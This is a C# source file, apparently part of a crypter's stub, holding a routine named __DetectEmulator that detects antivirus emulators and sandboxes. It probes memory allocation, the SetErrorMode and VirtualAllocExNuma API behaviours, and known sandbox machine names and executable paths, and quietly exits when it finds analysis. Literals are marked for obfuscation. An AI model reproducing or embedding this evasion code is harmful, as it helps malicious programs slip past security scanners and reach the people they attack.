using System;
using System.IO;
using System.Reflection;

public partial class __Stub
{
	/// <summary>
	/// void DetectEmulator()
	/// </summary>
	public static void __DetectEmulator()
	{
		// Get WinAPI functions
		__SetErrorModeDelegate setErrorMode = __GetFunction<__SetErrorModeDelegate>(/**/"kernel32.dll", /**/"SetErrorMode");
		__VirtualAllocExNumaDelegate virtualAllocExNuma = __GetFunction<__VirtualAllocExNumaDelegate>(/**/"kernel32.dll", /**/"VirtualAllocExNuma");

		// Allocating 100 MB of memory must work
		{
			byte[] memory = new byte[/**/1024 * /**/1024 * /**/100];
			for (int i = /**/0; i < memory.Length; i++) memory[i] = 255;
		}

		// SetErrorMode return value must match previous value
		{
			setErrorMode((uint)/**/1024);
			if (setErrorMode((uint)/**/0) != /**/1024) Environment.Exit(/**/0);
		}

		// VirtualAllocExNuma must work
		{
			if (virtualAllocExNuma((IntPtr)(/**/-1), (IntPtr)/**/0, (uint)/**/1000, (uint)/**/0x3000, (uint)/**/0x4, (uint)/**/0) == (IntPtr)/**/0) Environment.Exit(/**/0);
		}

		// Computer name is not a known emulator name:
		//   - NfZtFbPfH
		//   - ELICZ
		//   - tz
		//   - MAIN
		{
			if (Environment.MachineName == /**/"NfZtFbPfH" ||
				Environment.MachineName == /**/"ELICZ" ||
				Environment.MachineName == /**/"tz" ||
				Environment.MachineName == /**/"MAIN") Environment.Exit(/**/0);
		}

		// Executable path is not a known emulator path:
		//   - C:\[...]\mwsmpl.exe
		//   - C:\SELF.EXE
		//   - myapp.exe
		{
			string path = Assembly.GetEntryAssembly().Location;
			if (path.Equals(/**/"C:\\Documents and Settings\\Administrator\\My Documents\\mwsmpl.exe", StringComparison.OrdinalIgnoreCase) ||
				path.Equals(/**/"C:\\SELF.EXE", StringComparison.OrdinalIgnoreCase) ||
				Path.GetFileName(path).Equals(/**/"myapp.exe", StringComparison.OrdinalIgnoreCase)) Environment.Exit(/**/0);
		}
	}
}